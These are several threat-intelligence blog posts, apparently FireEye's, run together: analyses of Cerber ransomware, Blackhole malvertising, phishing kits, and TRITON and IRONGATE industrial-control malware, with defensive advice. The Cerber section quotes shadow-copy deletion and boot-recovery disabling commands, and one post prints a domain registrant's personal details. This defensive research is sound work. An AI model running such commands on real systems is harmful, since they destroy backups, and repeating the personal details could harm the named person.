uses native Windows utilities such as WMIC and/or VSSAdmin to delete backups and shadow copies. Files are encrypted and messages are presented to the user requesting payment. Rather than waiting for the payload to be downloaded or started around stage four or five of the aforementioned attack cycle, Exploit Guard provides coverage for most steps of the attack cycle – beginning in this case at the second step. The most common way to deliver ransomware is via Word documents with embedded macros or a Microsoft Office exploit. FireEye Exploit Guard detects both of these attacks at the initial stage of the attack cycle. PowerShell Abuse When the victim opens the attached Word document, the malicious macro writes a small piece of VBScript into memory and executes it. This VBScript executes PowerShell to connect to an attacker-controlled server and download the ransomware (profilest.exe), as seen in Figure 1. Figure 1. Launch sequence of Cerber – the macro is responsible for invoking PowerShell and PowerShell downloads and runs the malware It has been increasingly common for threat actors to use malicious macros to infect users because the majority of organizations permit macros to run from Internet-sourced office documents. In this case we observed the macrocode calling PowerShell to bypass execution policies – and run in hidden as well as encrypted mode – with the intention that PowerShell would download the ransomware and execute it without the knowledge of the victim. Further investigation of the link and executable showed that every few seconds the malware hash changed with a more current compilation timestamp and different appended data bytes – a technique often used to evade hash-based detection. Cerber in Action Initial payload behavior Upon execution, the Cerber malware will check to see where it is being launched from. Unless it is being launched from a specific location (%APPDATA%\\&#60GUID&#62), it creates a copy of itself in the victim's %APPDATA% folder under a filename chosen randomly and obtained from the %WINDIR%\\system32 folder. If the malware is launched from the specific aforementioned folder and after eliminating any blacklisted filenames from an internal list, then the malware creates a renamed copy of itself to “%APPDATA%\\&#60GUID&#62” using a pseudo-randomly selected name from the “system32” directory. The malware executes the malware from the new location and then cleans up after itself. Shadow deletion As with many other ransomware families, Cerber will bypass UAC checks, delete any volume shadow copies and disable safe boot options. Cerber accomplished this by launching the following processes using respective arguments: Vssadmin.exe \"delete shadows /all /quiet\" WMIC.exe \"shadowcopy delete\" Bcdedit.exe \"/set {default} recoveryenabled no\" Bcdedit.exe \"/set {default} bootstatuspolicy ignoreallfailures Coercion People may wonder why victims pay the ransom to the threat actors. In some cases it is as simple as needing to get files back, but in other instances a victim may feel coerced or even intimidated. We noticed these tactics being used in this campaign, where the victim is shown the message in Figure 2 upon being infected with Cerber. Figure 2. A message to the victim after encryption The ransomware authors attempt to incentivize the victim into paying quickly by providing a 50 percent discount if the ransom is paid within a certain timeframe, as seen in Figure 3. Figure 3. Ransom offered to victim, which is discounted for five days Multilingual Support As seen in Figure 4, the Cerber ransomware presented its message and instructions in 12 different languages, indicating this attack was on a global scale. Figure 4.   Interface provided to the victim to pay ransom supports 12 languages Encryption Cerber targets 294 different file extensions for encryption, including .doc (typically Microsoft Word documents), .ppt (generally Microsoft PowerPoint slideshows), .jpg and other images. It also targets financial file formats such as. ibank (used with certain personal finance management software) and .wallet (used for Bitcoin). Selective Targeting Selective targeting was used in this campaign. The attackers were observed checking the country code of a host machine’s public IP address against a list of blacklisted countries in the JSON configuration, utilizing online services such as ipinfo.io to verify the information. Blacklisted (protected) countries include: Armenia, Azerbaijan, Belarus, Georgia, Kyrgyzstan, Kazakhstan, Moldova, Russia, Turkmenistan, Tajikistan, Ukraine, and Uzbekistan . The attack also checked a system's keyboard layout to further ensure it avoided infecting machines in the attackers geography: 1049—Russian, ¨ 1058—Ukrainian, 1059—Belarusian, 1064—Tajik, 1067—Armenian, 1068—Azeri, (Latin), 1079—Georgian, 1087—Kazakh, 1088—Kyrgyz (Cyrillic), 1090—Turkmen, 1091—Uzbek (Latin), 2072—Romanian (Moldova), 2073—Russian (Moldova), 2092—Azeri (Cyrillic), 2115—Uzbek (Cyrillic). Selective targeting has historically been used to keep malware from infecting endpoints within the author’s geographical region, thus protecting them from the wrath of local authorities. The actor also controls their exposure using this technique. In this case, there is reason to suspect the attackers are based in Russia or the surrounding region. Anti VM Checks The malware searches for a series of hooked modules, specific filenames and paths, and known sandbox volume serial numbers, including: sbiedll.dll, dir_watch.dll, api_log.dll, dbghelp.dll, Frz_State, C:\\popupkiller.exe, C:\\stimulator.exe, C:\\TOOLS\\execute.exe, \\sand-box\\, \\cwsandbox\\, \\sandbox\\, 0CD1A40, 6CBBC508, 774E1682, 837F873E, 8B6F64BC. Aside from the aforementioned checks and blacklisting, there is also a wait option built in where the payload will delay execution on an infected machine before it launches an encryption routine. This technique was likely implemented to further avoid detection within sandbox environments. Persistence Once executed, Cerber deploys the following persistence techniques to make sure a system remains infected: A registry key is added to launch the malware instead of the screensaver when the system becomes idle. The “CommandProcessor” Autorun keyvalue is changed to point to the Cerber payload so that the malware will be launched each time the Windows terminal, “cmd.exe”, is launched. A shortcut (.lnk) file is added to the startup folder. This file references the ransomware and Windows will execute the file immediately after the infected user logs in. Common persistence methods such as run and runonce key are also used. A Solid Defense Mitigating ransomware malware has become a high priority for affected organizations because passive security technologies such as signature-based containment have proven ineffective. Malware authors have demonstrated an ability to outpace most endpoint controls by compiling multiple variations of their malware with minor binary differences. By using alternative packers and compilers, authors are increasing the level of effort for researchers and reverse-engineers. Unfortunately, those efforts don’t scale. Disabling support for macros in documents from the Internet and increasing user awareness are two ways to reduce the likelihood of infection. If you can, consider blocking connections to websites you haven’t explicitly whitelisted. However, these controls may not be sufficient to prevent all infections or they may not be possible based on your organization. FireEye Endpoint Security with Exploit Guard helps to detect exploits and techniques used by ransomware attacks (and other threat activity) during execution and provides analysts with greater visibility. This helps your security team conduct more detailed investigations of broader categories of threats. This information enables your organization to quickly stop threats and adapt defenses as needed. Conclusion Ransomware has become an increasingly common and effective attack affecting enterprises, impacting productivity and preventing users from accessing files and data. Mitigating the threat of ransomware requires strong endpoint controls, and may include technologies that allow security personnel to quickly analyze multiple systems and correlate events to identify and respond to threats. HX with Exploit Guard uses behavioral intelligence to accelerate this process, quickly analyzing endpoints within your enterprise and alerting your team so they can conduct an investigation and scope the compromise in real-time. Traditional defenses don’t have the granular view required to do this, nor can they connect the dots of discreet individual processes that may be steps in an attack. This takes behavioral intelligence that is able to quickly analyze a wide array of processes and alert on them so analysts and security teams can conduct a complete investigation into what has, or is, transpiring. This can only be done if those professionals have the right tools and the visibility into all endpoint activity to effectively find every aspect of a threat and deal with it, all in real-time.

                "text": "Last week got us up close and personal with Darkleech and Blackhole with our external careers web site. The fun didn’t end there, this week we saw a tidal wave of Darkleech activity linked to a large-scale malvertising campaign identified by the following URL: hXXp://delivery[.]globalcdnnode[.]com/7f01baa99716452bda5bba0572c58be9/afr-zone.php Again Darkleech was up to its tricks, injecting URLs and sending victims to a landing page belonging to the Blackhole Exploit Kit, one of the most popular and effective exploit kits available today. Blackhole wreaks havoc on computers by exploiting vulnerabilities in client applications like IE, Java and Adobe, computers that are vulnerable to exploits launched by Blackhole are likely to become infected with one of several flavors of malware including ransomware , Zeus/Zbot variants and clickfraud trojans like ZeroAccess. We started logging hits at 21:31:00 UTC on Sunday 09/22/2013, the campaign has been ongoing, peaking Monday and tapered down through out the week. During most of the campaign’s run, delivery[.]globalcdnnode[.]com appeared to have gone dark, no longer serving the exploit kit’s landing page as expected and then stopped resolving altogether, yet tons of requests kept flowing. This left some scratching their heads as to whether the noise was a real threat. Indeed, it was a real threat, as Blackhole showed up to the party a couple of days later; this was confirmed by actually witnessing a system get attacked on a subsequent visit to the URL. Figure 1. – Session demonstrating exploit via IE browser and Java. The server returned the (obfuscated) Blackhole Landing page; no 404 this time. Figure 2 – request and response to to delivery[.]globalcdnnode[.]com. The next stage was to load a new URL for the malicious jar file. At this point, the unpatched Windows XP system running vulnerable Java quickly succumbed to CVE-2013-0422 . Figure 3 – Packet capture showing JAR file being downloaded. Figure 4. – Some of the Java class files visible in the downloaded Jar. Even though our system was exploited and the browser was left in a hung state, it did not receive the payload. Given the sporadic availability during the week of both the host and exploit kit’s landing page, it’s possible the system is or was undergoing further setup and this is the prelude to yet another large-scale campaign. We can’t say for sure but we know this is not the last time we will see it or the crimeware actor behind it. Registrant: Name: Alexey Prokopenko Organization: home Address: Lenina 4, kv 1 City: Ubileine Province/state: LUGANSKA OBL Country: UA Postal Code: 519000 Email: alex1978a @bigmir.net By the way, this actor has a long history of malicious activity online too. The campaign also appears to be abusing Amazon Web Services. globalcdnnode.com Server:           ns-293.awsdns-36.com Address:    205.251.193.37#53 globalcdnnode.com origin = ns-293.awsdns-36.com mail addr = awsdns-hostmaster.amazon.com At time of this writing, the domain delivery[.]globalcdnnode[.]com was still resolving, using fast-flux DNS techniques to resolve to a different IP address every couple minutes, thwarting attempts at shutting down the domain by constantly being on the move. Figure 5. – The familiar Plesk control panel, residing on the server. This was a widespread campaign, indirectly affecting many web sites via malvertising techniques. The referring hosts run the gamut from local radio stations to high profile news, sports, and shopping sites. Given the large amounts of web traffic these types of sites see, its not surprising there was a tidal wave of requests to delivery[.]globalcdnnode[.]com. Every time a page with the malvertisement was loaded, a request was made to hXXp://delivery.globalcdnnode.com/7f01baa99716452bda5bba0572c58be9/afr-zone.php, in the background. To give an example of what this activity looked like from DTI, you can see the numbers in the chart below. Figure 6. – DTI graph showing number of Darkleech detections logged each day. By using malvertising and or posing as a legitimate advertiser or content delivery network, the bad guys infiltrate the web advertisement ecosystem. This results in their malicious content getting loaded in your browser, often times in the background , while you browse sites that have nothing to do with the attack (as was the case in our careers site). Imagine a scenario where a good portion of enterprise users have a home page set to a popular news website . More than likely, the main web page has advertisements, and some of those ads could be served from 3 rd party advertiser networks and or CDNs. If just one of those advertisements on the page is malicious, visitors to that page are at risk of redirection and or infection, even though the news website’s server is itself clean. So, when everybody shows up to work on Monday and opens their browsers, there could be a wave of clients making requests to exploit kit landing pages, if Darkleech is lurking in those advertisement waters, you could end up with a leech or 2 attached to your network.

                "text": "Introduction Through FireEye’s Email Threat Prevention (ETP) solution, FireEye Labs discovered a phishing campaign in the wild targeting the credit card data and other personal information of Netflix users primarily based in the United States. This campaign is interesting because of the evasion techniques that were used by the attackers: The phishing pages were hosted on legitimate, but compromised web servers. Client-side HTML code was obfuscated with AES encryption to evade text-based detection. Phishing pages were not displayed to users from certain IP addresses if its DNS resolved to companies such as Google or PhishTank. At the time of posting, the phishing websites we observed were no longer active. Attack Flow The attack seems to start with an email notification – sent by the attackers – that asks the user to update their Netflix membership details. The phishing link inside the email body directs recipients to a page that attempts to mimic a Netflix login page, as seen in Figure 1. Figure 1: Fake login page mimicking the Netflix website Upon submitting their credentials, victims are then directed to webpages requesting additional membership details (Figure 2) and payment information (Figure 3). These websites also attempt to mimic authentic Netflix webpages and appear legitimate. Once the user has entered their information, they are taken to the legitimate Netflix homepage. Figure 2: Fake webpage asking users to update their personal details Figure 3: Netflix phishing webpage used to steal credit card information Technical Details The phishing kit uses techniques to evade phishing filters. One technique is the use of AES encryption to encode the content presented at the client’s side, as seen in Figure 4. The purpose of using this technique is code obfuscation, which helps to evade text-based detection. By obfuscating the webpage, attackers try to deceive text-based classifiers and prevent them from inspecting webpage content. This technique employs two files, a PHP and a JavaScript file that have functions to encrypt and decrypt input strings. The PHP file is used to encrypt the webpages at the server side, as seen in Figure 5. At the client side, the encrypted content is decoded using a defined function in the JavaScript file, as seen in Figure 6. Finally, the webpage is rendered using the ‘document.write’ function. Figure 4: Client-side code obfuscation using AES encryption Figure 5: PHP code used at server side for encryption Figure 6: JavaScript code used at client-side for decryption Another technique is the host-based evasion, as seen in Figure 7. The host name of organizations such as ‘phishtank’ and ‘google’ are blacklisted. The host name of the client is compared against a list of blacklisted host names. If there is a match against the blacklist, a “404 Not Found” error page is presented. Figure 7: Server side code for blacklisting known hosts. Click image to enlarge. As with the majority of phishing attacks, this campaign uses PHP mail utility to send the attacker the stolen credentials. The advantage of using this technique is that the attacker can host their phishing kits on a number of websites and still get the stolen credentials and other information from a single email account. This enables attackers to extend their reach.

                "text": "FireEye Labs recently discovered a malicious phishing domain designed to steal a variety of information – including credentials and mobile numbers – from customers of several banks in India. Currently, we have not observed this domain being used in any campaigns. The phishing websites appear to be in the earlier stages of development and through this post we hope users will be able to identify these types of emerging threats in the future. FireEye phishing detection technology identified a newly registered domain, “csecurepay[.]com”, that was registered on Oct. 23, 2016. The website purports to offer online payment gateway services, but is actually a phishing website that leads to the capturing of victim logon credentials – and other information – for multiple banks operating in India. Prior to publication, FireEye notified the Indian Computer Emergency Response Team. Phishing Template Presentation and Techniques Step 1 URL: hxxp://csecurepay[.]com/load-cash-step2.aspx When navigating to the URL, the domain appears to be a payment gateway and requests that the user enter their bank account number and the amount to be transferred, as seen in Figure 1. The victim is allowed to choose their bank from a list that is provided. Figure 1: Bank information being requested By looking at the list, it is clear that only Indian banks are being targeted at this time. A total of 26 banks are available and these are named in the Appendix. Step 2 URL:  hxxp://csecurepay[.]com/PaymentConfirmation.aspx The next website requests the victim to enter their valid 10-digit mobile number and email ID (Figure 2), which makes the website appear more legitimate. Figure 2: Personal information being requested Step 3 The victim will then be redirected to the spoofed online banking page of the bank they selected, which requests that they log in using their user name and password. Figure 3 shows a fake login page for State Bank of India. See the Appendix for more banks that have spoofed login pages. Figure 3: Fake login page for State Bank of India After entering their login credentials, the victim will be asked to key in their One Time Password (OTP), as seen in Figure 4. Figure 4: OTP being requested Step 4 URL: hxxp://csecurepay[.]com/Final.aspx Once all of the sensitive data is gathered, a fake failed login message will be displayed to the victim, as seen in Figure 5. Figure 5: Fake error message being displayed Credit and Debit Card Phishing Website Using the registrant information from the csecurepay domain, we found another domain registered by the phisher as “nsecurepay[.]com”. The domain, registered in latest August 2016, aims to steal credit and debit card information. The following are among the list of cards that are targeted: 1.     ICICI Credit Card 2.     ICICI Debit Card 3.     Visa/Master Credit Card 4.     Visa/Master Debit Card 5.     SBI Debit Card Only At the time of this writing, the nsecurepay website was producing errors when redirecting to spoofed credit and debit card pages. Figure 6 shows the front end. Figure 6: Nsecurepay front end Conclusion Phishing has its own development lifecycle. It usually starts off with building the tools and developing the “hooks” for luring victims into providing their financial information. Once the phishing website (or websites) is fully operational, we typically begin to see a wave of phishing emails pointing to it. In this case, we see that phishing websites have been crafted to spoof multiple banks in India. These attackers can potentially grab sensitive online banking information and other personal data, and even provided support for multifactor authentication and OTP. Moreover, disguising the initial presentation to appear as an online payment gateway service makes the phishing attack seem more legitimate. FireEye Labs detects this phishing attack and customers will be protected against the usage of these sites in possible future campaigns. Appendix Fake login pages were served for 26 banks.

At FireEye Labs we have an automated system designed to proactively detect newly registered malicious domains and this system had observed some phishing domains that were designed to appear as legitimate Apple domains. Most of the domains reported by this system were suspended in June 2016, which resulted in a loss of momentum for the Zycode phishing campaign. Throughout the second quarter of 2016, the Zycode phishing campaign was in hibernation. We recently observed a resurgence of the same phishing campaign when our systems detected roughly 90 phony Apple-like domains that were registered from July 2016 to September 2016. Once again, Chinese Apple users are being targeted for their Apple IDs and passwords using the same content reported on in our earlier blog. The majority of these domains are registered in the .com TLD by email accounts from qq[.]com, and the IPs of these domains point to mainland China, as seen in Figure 1. Figure 1: Google map showing the location of the hosted phishing domains What has not Changed? The attackers have not changed the content of the phishing sites.

                "text": "Introduction Mandiant recently responded to an incident at a critical infrastructure organization where an attacker deployed malware designed to manipulate industrial safety systems. The targeted systems provided emergency shutdown capability for industrial processes. We assess with moderate confidence that the attacker was developing the capability to cause physical damage and inadvertently shutdown operations. This malware, which we call TRITON, is an attack framework built to interact with Triconex Safety Instrumented System (SIS) controllers. We have not attributed the incident to a threat actor, though we believe the activity is consistent with a nation state preparing for an attack. TRITON is one of a limited number of publicly identified malicious software families targeted at industrial control systems (ICS) . It follows Stuxnet which was used against Iran in 2010 and Industroyer which we believe was deployed by Sandworm Team against Ukraine in 2016. TRITON is consistent with these attacks, in that it could prevent safety mechanisms from executing their intended function, resulting in a physical consequence. Malware Family Main Modules Description TRITON trilog.exe Main executable leveraging libraries.zip library.zip Custom communication library for interaction with Triconex controllers. Table 1: Description of TRITON Malware Incident Summary The attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers. During the incident, some SIS controllers entered a failed safe state, which automatically shutdown the industrial process and prompted the asset owner to initiate an investigation. The investigation found that the SIS controllers initiated a safe shutdown when application code between redundant processing units failed a validation check -- resulting in an MP diagnostic failure message. We assess with moderate confidence that the attacker inadvertently shutdown operations while developing the ability to cause physical damage for the following reasons: Modifying the SIS could prevent it from functioning correctly, increasing the likelihood of a failure that would result in physical consequences. TRITON was used to modify application memory on SIS controllers in the environment, which could have led to a failed validation check. The failure occurred during the time period when TRITON was used. It is not likely that existing or external conditions, in isolation, caused a fault during the time of the incident. Attribution FireEye has not connected this activity to any actor we currently track; however, we assess with moderate confidence that the actor is sponsored by a nation state. The targeting of critical infrastructure as well as the attacker’s persistence, lack of any clear monetary goal and the technical resources necessary to create the attack framework suggest a well-resourced nation state actor.  Specifically, the following facts support this assessment: The attacker targeted the SIS suggesting an interest in causing a high-impact attack with physical consequences. This is an attack objective not typically seen from cyber-crime groups. The attacker deployed TRITON shortly after gaining access to the SIS system, indicating that they had pre-built and tested the tool which would require access to hardware and software that is not widely available. TRITON is also designed to communicate using the proprietary TriStation protocol which is not publicly documented suggesting the adversary independently reverse engineered this protocol. The targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with numerous attack and reconnaissance activities carried out globally by Russian, Iranian, North Korean, U.S., and Israeli nation state actors. Intrusions of this nature do not necessarily indicate an immediate intent to disrupt targeted systems, and may be preparation for a contingency. Background on Process Control and Safety Instrumented Systems Figure 1: ICS Reference Architecture Modern industrial process control and automation systems rely on a variety of sophisticated control systems and safety functions. These systems and functions are often referred to as Industrial Control Systems (ICS) or Operational Technology (OT). A Distributed Control System (DCS) provides human operators with the ability to remotely monitor and control an industrial process. It is a computerized control system consisting of computers, software applications and controllers. An Engineering Workstation is a computer used for configuration, maintenance and diagnostics of the control system applications and other control system equipment. A SIS is an autonomous control system that independently monitors the status of the process under control. If the process exceeds the parameters that define a hazardous state, the SIS attempts to bring the process back into a safe state or automatically performs a safe shutdown of the process. If the SIS and DCS controls fail, the final line of defense is the design of the industrial facility, which includes mechanical protections on equipment (e.g. rupture discs), physical alarms, emergency response procedures and other mechanisms to mitigate dangerous situations. Asset owners employ varied approaches to interface their plant's DCS with the SIS. The traditional approach relies on the principles of segregation for both communication infrastructures and control strategies. For at least the past decade, there has been a trend towards integrating DCS and SIS designs for various reasons including lower cost, ease of use, and benefits achieved from exchanging information between the DCS and SIS. We believe TRITON acutely demonstrates the risk associated with integrated designs that allow bi-directional communication between DCS and SIS network hosts. Safety Instrumented Systems Threat Model and Attack Scenarios Figure 2: Temporal Relationship Between Cyber Security and Safety The attack lifecycle for disruptive attacks against ICS is similar to other types of cyber attacks, with a few key distinctions. First, the attacker’s mission is to disrupt an operational process rather than steal data. Second, the attacker must have performed OT reconnaissance and have sufficient specialized engineering knowledge to understand the industrial process being controlled and successfully manipulate it. Figure 2 represents the relationship between cyber security and safety controls in a process control environment. Even if cyber security measures fail, safety controls are designed to prevent physical damage. To maximize physical impact, a cyber attacker would also need to bypass safety controls. The SIS threat model below highlights some of the options available to an attacker who has successfully compromised an SIS. Attack Option 1: Use the SIS to shutdown the process The attacker can reprogram the SIS logic to cause it to trip and shutdown a process that is, in actuality, in a safe state. In other words, trigger a false positive. Implication: Financial losses due to process downtime and complex plant start up procedure after the shutdown. Attack Option 2: Reprogram the SIS to allow an unsafe state The attacker can reprogram the SIS logic to allow unsafe conditions to persist. Implication: Increased risk that a hazardous situation will cause physical consequences (e.g. impact to equipment, product, environment and human safety) due to a loss of SIS functionality. Attack Option 3: Reprogram the SIS to allow an unsafe state – while using the DCS to create an unsafe state or hazard The attacker can manipulate the process into an unsafe state from the DCS while preventing the SIS from functioning appropriately. Implication: Impact to human safety, the environment, or damage to equipment, the extent of which depends on the physical constraints of the process and the plant design. Analysis of Attacker Intent We assess with moderate confidence that the attacker’s long-term objective was to develop the capability to cause a physical consequence. We base this on the fact that the attacker initially obtained a reliable foothold on the DCS and could have developed the capability to manipulate the process or shutdown the plant, but instead proceeded to compromise the SIS system. Compromising both the DCS and SIS system would enable the attacker to develop and carry out an attack that causes the maximum amount of damage allowed by the physical and mechanical safeguards in place. Once on the SIS network, the attacker used their pre-built TRITON attack framework to interact with the SIS controllers using the TriStation protocol. The attacker could have caused a process shutdown by issuing a halt command or intentionally uploading flawed code to the SIS controller to cause it to fail. Instead, the attacker made several attempts over a period of time to develop and deliver functioning control logic for the SIS controllers in this target environment. While these attempts appear to have failed due one of the attack scripts’ conditional checks, the attacker persisted with their efforts. This suggests the attacker was intent on causing a specific outcome beyond a process shutdown. Of note, on several occasions, we have observed evidence of long term intrusions into ICS which were not ultimately used to disrupt or disable operations. For instance, Russian operators, such as Sandworm Team, have compromised Western ICS over a multi-year period without causing a disruption. Summary of Malware Capabilities The TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITON’s extensive reconnaissance capabilities). The TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as halt or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks. Recommendations Asset owners who wish to defend against the capabilities demonstrated in the incident, should consider the following controls: Where technically feasible, segregate safety system networks from process control and information system networks. Engineering workstations capable of programming SIS controllers should not be dual-homed to any other DCS process control or information system network. Leverage hardware features that provide for physical control of the ability to program safety controllers. These usually take the form of switches controlled by a physical key. On Triconex controllers, keys should not be left in the PROGRAM mode other than during scheduled programming events. Implement change management procedures for changes to key position. Audit current key state regularly. Use a unidirectional gateway rather than bidirectional network connections for any applications that depend on the data provided by the SIS. Implement strict access control and application whitelisting on any server or workstation endpoints that can reach the SIS system over TCP/IP. Monitor ICS network traffic for unexpected communication flows and other anomalous activity. Figure 3: Triconex Key Switch ( source ) Appendix: Technical Analysis Figure 4: TRITON Architecture and Attack Scenario TRITON was deployed on an SIS engineering workstation running the Microsoft Windows operating system. The malware was named to masquerade as the legitimate Triconex Trilog application. This application is used for reviewing logs and is a part of the TriStation application suite. The malware was delivered as a Py2EXE compiled python script dependent on a zip file containing standard Python libraries, open source libraries, as well as the attacker-developed Triconex attack framework for interacting with the Triconex controllers. Along with the executable, two binary files, inject.bin (malicious function code) and imain.bin (malicious control logic) , were deployed as the controller’s payload. These file names were hard coded in the Py2EXE compiled python script. Trilog.exe took one option from the command line, which was a single IP address of the target Triconex device. It did not leverage the underlying TRITON library’s capability for Triconex device discovery, instead an instance of trilog.exe had to be invoked separately for each target controller in the environment. Once invoked, trilog.exe checked the status of the controller, then read the configuration information exposed by the TriStation protocol. If the controller was in a running state, trilog.exe encoded the two payload files inject.bin and imain.bin and passed them to the communication libraries to be appended to the controller’s program memory and execution table. After payload files were inserted into memory on the Triconex controller, the script initiated a countdown, periodically checking the status of the controller. If an error was detected, the communication library’s method SafeAppendProgramMod attempted to reset the controller to the previous state using a TriStation protocol command. If this failed, trilog.exe attempted to write a small ‘dummy’ program to memory. We assess that this was an anti-forensics technique to hide the presence of the attacker code on the Triconex controller. Working with the asset owner, Mandiant ran trilog.exe in a lab environment with a valid Triconex controller and discovered a conditional check in the malware that prevented the payload binary from persisting in the environment. Mandiant confirmed that, after correcting patching the attack script to remove this check, the payload binary would persist in controller memory, and the controller would continue to run. TRITON implements the TriStation protocol, which is the protocol used by the legitimate TriStation application, to configure controllers. TsHi is the high-level interface created by the malware’s authors that allows the threat actor’s operators to implement attack scripts using the TRITON framework. It exposes functions for both reconnaissance and attack. The functions generally accept binary data from the user, and handle the code ‘signing’ and check sums prior to passing the data to lower level libraries for serialization on to the network. TsBase , another attacker-written module, contains the functions called by TsHi , which translate the attacker’s intended action to the appropriate TriStation protocol function code. For certain functions, it also packs and pads the data in to the appropriate format. TsLow is an additional attacker module that implements the TriStation UDP wire protocol. The TsBase library primarily depends on the ts_exec method. This method takes the function code and expected response code, and serializes the commands payload over UDP. It checks the response from the controller against the expected value and returns a result data structure indicating success or a False object representing failure. TsLow also exposes the connect method used to check connectivity to the target controller. If invoked with no targets, it runs the device discovery function detect_ip. This leverages a \"ping\" message over the TriStation protocol using IP broadcast to find controllers that are reachable via a router from where the script is invoked.

These vulnerabilities affect the reliable operation of sensors, programmable controllers, software and networking equipment used to automate and monitor the physical processes that keep our modern world running. FireEye iSIGHT Intelligence has identified nearly 1,600 publicly disclosed ICS vulnerabilities since 2000. We go more in depth on these issues in our latest report, Overload: Critical Lessons from 15 Years of ICS Vulnerabilities , which highlights trends in total ICS vulnerability disclosures, patch availability, vulnerable device type and vulnerabilities exploited in the wild. FireEye’s acquisition of iSIGHT provided tremendous visibility into the depth and breadth of vulnerabilities in the ICS landscape and how threat actors try to exploit them. To make matters worse, many of these vulnerabilities are left unpatched and some are simply unpatchable due to outdated technology, thus increasing the attack surface for potential adversaries. In fact, nation-state cyber threat actors have exploited five of these vulnerabilities in attacks since 2009. Unfortunately, security personnel from manufacturing, energy, water and other industries are often unaware of their own control system assets, not to mention the vulnerabilities that affect them. As a result, organizations operating these systems are missing the warnings and leaving their industrial environments exposed to potential threats. Click here to download the report and learn more.

Our analysis finds that IRONGATE invokes ICS attack concepts first seen in Stuxnet , but in a simulation environment. Because the body of industrial control systems (ICS) and supervisory control and data acquisition (SCADA) malware is limited, we are sharing details with the broader community. Malicious Concepts Deceptive Man-in-the-Middle IRONGATE's key feature is a man-in-the-middle (MitM) attack against process input-output (IO) and process operator software within industrial process simulation. The malware replaces a Dynamic Link Library (DLL) with a malicious DLL, which then acts as a broker between a PLC and the legitimate monitoring software. This malicious DLL records five seconds of 'normal' traffic from a PLC to the user interface and replays it, while sending different data back to the PLC. This could allow an attacker to alter a controlled process unbeknownst to process operators. Sandbox Evasion IRONGATE's second notable feature involves sandbox evasion. Some droppers for the IRONGATE malware would not run if VMware or Cuckoo Sandbox environments were employed. The malware uses these techniques to avoid detection and resist analysis, and developing these anti-sandbox techniques indicates that the author wanted the code to resist casual analysis attempts. It also implies that IRONGATE’s purpose was malicious, as opposed to a tool written for other legitimate purposes. Dropper Observables We first identified IRONGATE when investigating droppers compiled with PyInstaller — an approach used by numerous malicious actors. In addition, strings found in the dropper include the word “payload”, which is commonly associated with malware. Unique Features for ICS Malware While IRONGATE malware does not compare to Stuxnet in terms of complexity, ability to propagate, or geopolitical implications, IRONGATE leverages some of the same features and techniques Stuxtnet used to attack centrifuge rotor speeds at the Natanz uranium enrichment facility; it also demonstrates new features for ICS malware. Both pieces of malware look for a single, highly specific process. Both replace DLLs to achieve process manipulation. IRONGATE detects malware detonation/observation environments, whereas Stuxnet looked for the presence of antivirus software. IRONGATE actively records and plays back process data to hide manipulations, whereas Stuxnet did not attempt to hide its process manipulation, but suspended normal operation of the S7-315 so even if rotor speed had been displayed on the HMI, the data would have been static . A Proof of Concept IRONGATE’s characteristics lead us to conclude that it is a test, proof of concept, or research activity. The code is specifically crafted to look for a user-created DLL communicating with the Siemens PLCSIM environment. PLCSIM is used to test PLC program functionality prior to in-field deployment. The DLLs that IRONGATE seeks and replaces are not part of the Siemens standard product set, but communicate with the S7ProSim COM object. Malware authors test concepts using commercial simulation software. Code in the malicious software closely matched usage on a control engineering blog dealing with PLCSIM (https://alexsentcha.wordpress.com/using-s7-prosim-with-siemens-s7-plcsim/ and https://pcplcdemos.googlecode.com/hg/S7PROSIM/BioGas/S7%20v5.5/). While we have identified and analyzed several droppers for the IRONGATE malware, we have yet to identify the code’s infection vector. In addition, our analysis did not identify what triggers the MitM payload to install; the scada.exe binary that deploys the IRONGATE DLL payload appears to require manual execution. We have not identified any other instances of the ICS-specific IRONGATE components ( scada.exe and Step7ProSim.dll ), despite their having been compiled in September of 2014. Siemens ProductCERT has confirmed that the code would not work against a standard Siemens control system environment. Implications for ICS Asset Owners Even though process operators face no increased risk from the currently identified members of the IRONGATE malware family, IRONGATE provides valuable insight into adversary mindset. Network security monitoring, indicator of compromise (IoC) matching, and good practice guidance from vendors and other stakeholders represent important defensive techniques for ICS networks. To specifically counter IRONGATE’s process attack techniques, ICS asset owners may, over the longer term, implement solutions that: Require integrity checks and code signing for vendor and user generated code. Lacking cryptographic verification facilitates file replacement and MitM attacks against controlled industrial processes. Develop mechanisms for sanity checking IO data, such as independent sensing and backhaul, and comparison with expected process state information. Ignorance of expected process state facilitates an attacker’s ability to achieve physical consequence without alarming operators. Technical Malware Analysis IRONGATE Dropper Family FireEye has identified six IRONGATE droppers: bla.exe, update.exe 1 , update_no_pipe.exe 1, update_no_pipe.exe 2 , update_no_pipe.exe 2 , update.exe 3 . All but one of these Python-based droppers first checks for execution in a VMware or Cuckoo Sandbox environment. If found, the malware exits. If not found, the IRONGATE dropper extracts a UPX-packed, publicly available utility ( NirSoft NetResView version 1.27 ) to audiodg.exe in the same directory as the dropper. The dropper then executes the utility using the command audiodg.exe /scomma scxrt2.ini. This command populates the file scxrt2.ini with a comma-separated list of network resources identified by the host system. The dropper iterates through each entry in scxrt2.ini , looking for paths named move-to-operational or move-to-operational.lnk . If a path is found, the dropper first extracts the Base64-encoded .NET executable scada.exe to the current directory and then moves the file to the path containing move-to-operational or move-to-operational.lnk. The path move-to-operational is interesting as well, perhaps implying that IRONGATE was not seeking the actual running process, but rather a staging area for code promotion. The dropper does not execute the scada.exe payload after moving it. Anti-Analysis Techniques Each IRONGATE dropper currently identified deploys the same .NET payload, scada.exe. All but one of the droppers incorporated anti-detection/analysis techniques to identify execution in VMware or the Cuckoo Sandbox. If such environments are detected, the dropper will not deploy the .NET executable ( scada.exe ) to the host. Four of the droppers ( update.exe 1 , update_no_pipe.exe 1 , update_no_pipe.exe 2 , and update.exe 3 ) detect Cuckoo environments by scanning subdirectories of the %SystemDrive% . Directories with names greater than 